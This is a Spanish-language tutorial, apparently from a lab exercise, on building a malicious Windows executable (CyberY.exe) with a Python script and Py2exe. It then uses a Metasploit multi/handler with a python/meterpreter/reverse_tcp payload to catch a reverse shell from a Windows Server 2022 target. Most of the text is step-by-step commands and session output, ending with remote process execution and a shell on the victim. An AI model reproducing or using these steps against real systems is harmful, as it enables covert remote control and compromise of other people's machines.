# Elaboración del Virus

Hay 2 formas de generar el .exe que se ejecuta para hacer el reverse utilizando Kali y Windows:

1. Creando el archivo .exe con el script manual desde cero y modificado.
2. Creando con el script ya hecho y listo para poner IP y puerto.

## Desde un Entorno Windows

La primera forma es crearlo en un entorno Windows instalando los prerrequisitos como:

- Python 2.7 
- Py2Exe

A continuación se encuentra el script para crearlo tú mismo, este genera el ejecutable .EXE.

**Link del código modificable del Script**: [aepy2exe.py](#)

### Explicación del Flujo Principal del Archivo .py:

Definir los argumentos del CLI:

```bash
python aepy2exe.py -ip 172.31.94.51 -p 443
```

- `-ip`: IP del atacante (por defecto 172.31.94.51).
- `-p`: Puerto del atacante (por defecto 443).

El script realizará lo siguiente:

- Generar, codificar y escribir el payload en un archivo.
- Convertir el script .py en un ejecutable con Py2exe.
- Limpiar los archivos temporales generados.
- Mostrar errores si ocurren.

El archivo .exe creado tendrá la IP y los puertos a escuchar. Este se ejecutará en el entorno Windows a atacar.

Para ejecutar el script en la terminal:

```bash
python aepy2exe.py -e py2exe -ip 172.31.94.51 -p 443
```

Esto generará un archivo llamado `CyberY.exe`, y se ejecutará en la misma máquina, no se envía a la víctima Windows.

## Segunda Forma Dentro de la Instancia de Windows

### Prerrequisitos para Instalar en la Instancia Windows Server 2022 a Ser Atacada:

1. Instalar Python 2.7.16 (versión x86 / 32 bits)
   - Descarga Python 2.7.16 desde: [python-2.7.16.msi](https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi)
   - Durante la instalación:
     - Asegúrese de marcar la opción para añadir Python al PATH.
     - Elija la instalación para todos los usuarios.
   - Verifique que Python esté correctamente instalado abriendo la consola de comandos y escribiendo:
     ```bash
     python --version
     ```
     Debería mostrar: `Python 2.7.16`.

2. Instalar Py2exe (32 bits para Python 2.7)
   - Descargue Py2exe desde: [py2exe-0.6.9.win32-py2.7.exe](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe)
   - Instale Py2exe y verifique que esté disponible:
     ```bash
     python -m py2exe
     ```

Este script crea un ejecutable malicioso a partir de un script Python utilizando Py2exe. Descarga el archivo `aepy2exe.py` y guárdalo en una carpeta, por ejemplo:

- **Descarga desde aquí el script ya hecho:** [Script Listo](#)

Abra un Símbolo del sistema como Administrador y navegue a la carpeta donde se guardó el archivo `aepy2exe.py`.

### Ejecución del Script aepy2exe.py

Ejemplo de ejecución:

La máquina atacante tiene la IP `172.31.94.51` y usará el puerto `443`.

Genera el ejecutable:

```bash
python aepy2exe.py -e py2exe -ip 172.31.94.51 -p 443
```

Esto generará un archivo llamado `CyberY.exe`.

### Prueba del Ejecutable Generado

Ejecuta el archivo en el entorno de prueba (Windows Server 2022):

- Ubicación referencial:
  ```
  C:\proyecto\CyberY.exe
  ```

## Atacar Desde AWS Linux con Kali + Metasploit

Principalmente se requiere una máquina virtual con Docker, donde tendremos un contenedor con una imagen de Kali Linux. Dentro de la imagen de Kali, necesitamos tener instalado el “Metasploit Framework”.

Los comandos que ejecutaremos son los siguientes:

Iniciamos el contenedor de Kali:

```bash
$ docker start -i kali 
# (kali es el nombre que se le asignó al contenedor)
```

Dentro del contenedor de Kali iniciamos Metasploit:

```bash
$ msfconsole
```

Desde ahora todos los comandos que vienen serán dentro de la consola de “msfconsole”.

Declaramos que usaremos el exploit genérico `multi/handler`, el cual es un manejador para recibir conexiones de payloads reversos:

```bash
use exploit/multi/handler
```

Se configura el payload `python/meterpreter/reverse_tcp`, que envía una sesión de Meterpreter a través de una conexión TCP inversa:

```bash
set PAYLOAD python/meterpreter/reverse_tcp
```

Se define el puerto local (`LPORT`) en `443` y la dirección del host local (`LHOST`) en `172.31.94.51`, que es la dirección IP de la máquina atacante:

```bash
set LPORT 443   
set LHOST 172.31.94.51
```

Ejecutamos el exploit para que quede escuchando cuando sea ejecutado en la otra máquina:

```bash
msf6 exploit(multi/handler) > exploit
```

La respuesta del comando anterior fue la siguiente:

```
[*] Started reverse TCP handler on 172.31.94.51:443 
[*] Sending stage (24772 bytes) to 172.31.45.226
[*] Meterpreter session 1 opened (172.31.94.51:443 -> 172.31.45.226:49753) at 2024-10-17 00:27:58 +0000 
```

# Existe una sesión abierta, es decir que una máquina se encuentra infectada.

Ejecución de los comandos “execute -f notepad.exe”, “execute -f calc.exe” y “shell” correctamente enviados.

```bash
meterpreter > execute -f notepad.exe
Process 1780 created.
meterpreter > execute -f calc.exe
Process 3564 created.
meterpreter > shell
Process 2576 created.
Channel 1 created.
```

Resultado con captura de los `execute` abriendo desde Kali hacia Windows Server 2022:
